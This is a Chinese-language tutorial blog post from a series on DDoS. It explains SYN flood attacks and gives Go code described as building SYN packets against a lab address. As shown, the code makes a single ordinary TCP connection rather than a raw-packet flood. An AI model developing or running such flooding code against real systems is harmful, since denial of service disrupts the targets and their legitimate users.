---
author: Sunny Tsai
title: "[Day 11] 閑的沒事就寫封包 - SYN Flood之建立封包"
date: 2023-09-24
math: true
tags: [
    "cloud",
    "syn",
    "syn flood"
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
# SYN Flood

盡其所能的丟SYN封包，消耗目標伺服器所有可用的資源。使TCP三方交握無法正常工作，使標的無法回應或緩慢回應合法流量。

## TCP三方交握（Three Way Handshake）
![](https://imgur.com/jE4zbhO.png)

1. client向Server發送SYN封包，請求連線。
2. Server向Client發送封包SYN/ACK封包，確認通訊中。
3. Client向Server發送ACK封包，建立通話。

### SYN Flood
![](https://imgur.com/1IQOzfh.png)
從TCP 三方交握的方式來看，一但任意地址向Server端發送SYN封包請求通話，Server端就會回傳一個SYN/ACK回應請求，並開啟一個PORT等待接收ACK封包。如此，攻擊者只要發送大量的SYN封包，Server端就會開啟一個臨時的PORT等待接收回應直到連線逾時，只要把Server端的PORT都佔用，將無法收到合法流量的封包。

註：當有ㄧ方的機器開啟連線，但另一方的機器卻未開啟，這個連線可以視為**半開放連線**。所以SYN Flood也可以視為**半開放式攻擊**

### SYN Packet

main.go
```go
package main

import (
	"fmt"
	"sync"

	"github.com/windasunny/ddos/packet"
)

func buildSynPacket(targetIp string, targetPort int) {

	err := packet.Syn(targetIp, targetPort)
	if err != nil {
		fmt.Println(err)
	}
}

func main() {

	// SYN
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		buildSynPacket("10.211.55.10", 12345)
		wg.Done()
	}()
	wg.Wait()
}

```

考慮了一下，random port先不下全域鎖。
sysSyn.go
```golang
// @Title   SYN.go
// @Description   Build a SYN packet with
// @Author   Sunny Tsai
// @Update   2023-09-24
package packet

import (
	"fmt"
	"math/rand"
	"net"
	"time"

	"golang.org/x/sys/unix"
)

// @title   Syn
// @description   Build a SYN packet with sys/unix
// @auth     Sunny Tsai     Time(2023/09/24)
// @param    targetIP        string        send to target ip address
// @param    targetPort      int           send to target port
// @return   error           error
func Syn(targetIP string, targetPort int) error {

	random := rand.New(rand.NewSource(time.Now().UnixNano()))

	srcIP := "0.0.0.0"
	srcPort := random.Intn(65535)

	// build socket
	fd, err := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, unix.IPPROTO_TCP)
	if err != nil {
		return fmt.Errorf("Failed to create socket: %v", err)
	}
	defer unix.Close(fd)

	// set source ip and port
	localAddr := &unix.SockaddrInet4{Port: srcPort}
	copy(localAddr.Addr[:], net.ParseIP(srcIP).To4())

	err = unix.Bind(fd, localAddr)
	if err != nil {
		return fmt.Errorf("Failed to bind socket: %v", err)
	}

	sendTo(targetIP, targetPort, fd)

	return nil
}

// @title   sendTo
// @description   Send SYN packet to target
// @auth     Sunny Tsai     Time(2023/09/24)
// @param    targetIP        string        send to target ip address
// @param    targetPort      int           send to target port
// @param    fd              int           socket fd
func sendTo(targetIP string, targetPort int, fd int) {
	// set target ip and port, then connect
	remoteAddr := &unix.SockaddrInet4{Port: targetPort}
	copy(remoteAddr.Addr[:], net.ParseIP(targetIP).To4())

	_ = unix.Connect(fd, remoteAddr)
}

```
